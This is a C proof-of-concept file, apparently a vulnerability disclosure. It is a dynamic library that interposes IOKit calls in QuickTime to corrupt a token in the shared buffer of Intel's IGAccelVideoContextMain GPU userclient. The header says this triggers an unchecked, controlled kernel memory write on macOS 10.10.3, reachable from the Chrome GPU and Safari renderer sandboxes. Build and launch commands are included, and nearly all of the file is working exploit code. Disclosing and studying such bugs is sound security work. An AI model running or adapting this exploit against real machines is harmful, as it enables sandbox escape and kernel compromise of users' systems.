/*

IGAccelVideoContextMain is the userclient used for GPU accelerated video encoding on the Intel HD integrated GPUs.
It's userclient 0x100 of the IntelAccelerator IOService. IOConnectMapMemory type=0 of this userclient is a shared token buffer.
The dword at offset 0x14 of token 0x83 is used to compute the offset
for a write without checking the bounds, allowing a controlled kernel memory write.

Compile this dylib:
  $ clang -Wall -dynamiclib -o ig_video_main_patch_encoding_common.dylib ig_video_main_patch_encoding_common.c -framework IOKit -arch i386 -arch x86_64 
Load it into Quicktime:
  $ DYLD_INSERT_LIBRARIES=./ig_video_main_patch_encoding_common.dylib /Applications/QuickTime\ Player.app/Contents/MacOS/QuickTime\ Player
Start a screen recording:
  File -> New Movie Recording -> Click the red circle -> start the recording
This interpose library will look for the ColorSpaceConversion token in the shared memory and trigger the bug.

Impact:
This userclient can be instantiated from the Chrome GPU process sandbox and the Safari renderer sandbox

tested on: MacBookAir5,2 w/ 10.10.3/14d131
*/


#include <inttypes.h>
#include <IOKit/IOKitLib.h>
#include <mach/mach.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>

// the mach port for the IGAccelVideoContextMain user client
mach_port_t main_port = 0;
void* token_buf = 0;
size_t token_buf_size = 0;

kern_return_t
fake_IOConnectCallMethod(
  mach_port_t  connection,    // In
  uint32_t   selector,    // In
  /*const*/ uint64_t  *input,     // In
  uint32_t   inputCnt,    // In
  /*const*/ void  *inputStruct,   // In
  size_t     inputStructCnt,  // In
  uint64_t  *output,    // Out
  uint32_t  *outputCnt,   // In/Out
  void    *outputStruct,    // Out
  size_t    *outputStructCntP)  // In/Out
{
  kern_return_t ret = 0;  
   
  ret = IOConnectCallMethod(
    connection,
    selector,
    input,
    inputCnt,
    inputStruct,
    inputStructCnt,
    output,
    outputCnt,
    outputStruct,
    outputStructCntP);

  return ret;
}


kern_return_t
fake_IOConnectMapMemory(
  io_connect_t connect,
  uint32_t memoryType,
  task_port_t intoTask,
  vm_address_t *atAddress,
  vm_size_t *ofSize,
  IOOptionBits options )
{
  printf("IOConnectMapMemory(connect=%x, memoryType=0x%x, intoTask=%x, atAddress=%p, ofSize=%x, options=%x)\n", connect, memoryType, intoTask, atAddress, ofSize, options);
  kern_return_t ret = IOConnectMapMemory(connect, memoryType, intoTask, atAddress, ofSize, options);
  if (memoryType == 0 && connect == main_port){
    token_buf = *atAddress;
    token_buf_size = *ofSize;
    printf("  this is the token buffer for IGAccelVideoContextMain\n");
  }
  printf("  after: *atAddress: %p *ofSize = %x\n", *atAddress,  *ofSize);
  return ret;
}

kern_return_t
fake_IOConnectUnmapMemory(
  io_connect_t connect,
  uint32_t memoryType,
  task_port_t intoTask,
  vm_address_t atAddress)
{
  printf("IOConnectUnmapMemory(connect=%x, memoryType=0x%x, intoTask=%x, atAddress=%p)\n", connect, memoryType, intoTask, atAddress);
  if (memoryType == 0 && connect == main_port){
    token_buf = 0;
  }
  return IOConnectUnmapMemory(connect, memoryType, intoTask, atAddress);
}

kern_return_t
fake_IOConnectCallStructMethod(
        mach_port_t      connection,            // In
        uint32_t         selector,              // In
        const void      *inputStruct,           // In
        size_t           inputStructCnt,        // In
        void            *outputStruct,          // Out
        size_t          *outputStructCnt)       // In/Out
{ 
  printf("callstructmethod\n");
  if (selector == 2 && connection == main_port){
    printf("submit_data_buffers on main port??: inputStructCnt == 0x%x\n", inputStructCnt);
    if (token_buf != 0){
      uint32_t offset = 4;
      uint16_t id;
      uint16_t len;
      uint32_t output_offset;

      uint16_t ColorSpaceConversion = 0x8300;
      uint32_t* tok = memmem(token_buf, token_buf_size, &ColorSpaceConversion, 2);
      if (tok){
        printf("******************************************* FOUND IT*************\n");
        tok[0x820/4] = 0x12345678; //this will be used to compute an index for a write, without any bounds checking
      }
    }
  }

  return IOConnectCallStructMethod(
          connection,            // In
          selector,              // In
          inputStruct,           // In
          inputStructCnt,        // In
          outputStruct,          // Out
          outputStructCnt);      // In/Out

}

CFMutableDictionaryRef
fake_IOServiceMatching(const char* name)
{
  CFMutableDictionaryRef ret = IOServiceMatching(name);
  printf("IOServiceMatching(name=%s) ret: %p\n", name, ret);
  return ret;
}

CFMutableDictionaryRef
fake_IOServiceNameMatching(
  const char *  name )
{
  CFMutableDictionaryRef ret = IOServiceNameMatching(name);
  printf("IOServiceNameMatching(name=%s) ret: %p\n", name, ret);
  return ret;
}

io_service_t
fake_IOServiceGetMatchingService(
  mach_port_t _masterPort,
  CFDictionaryRef matching )
{
  io_service_t ret = IOServiceGetMatchingService(_masterPort, matching);
  printf("IOServiceGetMatchingService(matching=%p) ret: %x\n", matching, ret);
  return ret;
}

kern_return_t
fake_IOServiceGetMatchingServices(
        mach_port_t _masterPort,
  CFDictionaryRef matching,
  io_iterator_t * existing )
{
  kern_return_t ret = IOServiceGetMatchingServices(_masterPort, matching, existing);
  printf("IOServiceGetMatchingServices(matching=%p, existing=%p) (*existing after call = %x\n", matching, existing, *existing);
  return ret;
}

kern_return_t
fake_IOServiceOpen(
  io_service_t service,
  task_port_t owningTask,
  uint32_t  type,
  io_connect_t  * connect )
{
  kern_return_t ret = IOServiceOpen(service, owningTask, type, connect);
  io_name_t className;
  IOObjectGetClass(service, className);
  printf("IOServiceOpen(service=%x, owningTask=%x, type=%x, connect=%p) (*connect after call = %x\n", service, owningTask, type, connect, *connect);
  printf("  (class: %s)\n", className);
  if (type == 0x100){
    //IGAccelVideoContextMain
    main_port = *connect;
  }
  return ret;
}

io_object_t
fake_IOIteratorNext(
  io_iterator_t iterator )
{
  io_object_t ret = IOIteratorNext(iterator);
  printf("IOIteratorNext(iterator=%x) ret: %x\n", iterator, ret);
  return ret;
}

kern_return_t
fake_IOConnectGetService(
  io_connect_t  connect,
  io_service_t  * service )
{
  kern_return_t ret = IOConnectGetService(connect, service);
  printf("IOConnectGetService(connect=%x, service=%p) (*service after call = %x\n", connect, service, *service);
  return ret;
}

kern_return_t
fake_IOServiceClose(
  io_connect_t  connect )
{
  printf("IOServiceClose(connect=%p)\n", connect);
  return IOServiceClose(connect);
}

typedef struct interposer {
  void* replacement;
  void* original;
} interpose_t;

__attribute__((used)) static const interpose_t interposers[]
  __attribute__((section("__DATA, __interpose"))) =
    { {.replacement = (void*)fake_IOConnectCallMethod, .original = (void*)IOConnectCallMethod}, 
      {.replacement = (void*)fake_IOConnectMapMemory, .original = (void*)IOConnectMapMemory},
      {.replacement = (void*)fake_IOConnectUnmapMemory, .original = (void*)IOConnectUnmapMemory},
      {.replacement = (void*)fake_IOConnectCallStructMethod, .original = (void*)IOConnectCallStructMethod},
      {.replacement = (void*)fake_IOServiceMatching, .original = (void*)IOServiceMatching},
      {.replacement = (void*)fake_IOServiceGetMatchingService, .original = (void*)IOServiceGetMatchingService},
      {.replacement = (void*)fake_IOServiceGetMatchingServices, .original = (void*)IOServiceGetMatchingServices},
      {.replacement = (void*)fake_IOServiceOpen, .original = (void*)IOServiceOpen},
      {.replacement = (void*)fake_IOIteratorNext, .original = (void*)IOIteratorNext},
      {.replacement = (void*)fake_IOConnectGetService, .original = (void*)IOConnectGetService},
      {.replacement = (void*)fake_IOServiceNameMatching, .original = (void*)IOServiceNameMatching},
      {.replacement = (void*)fake_IOServiceClose, .original = (void*)IOServiceClose},
    };

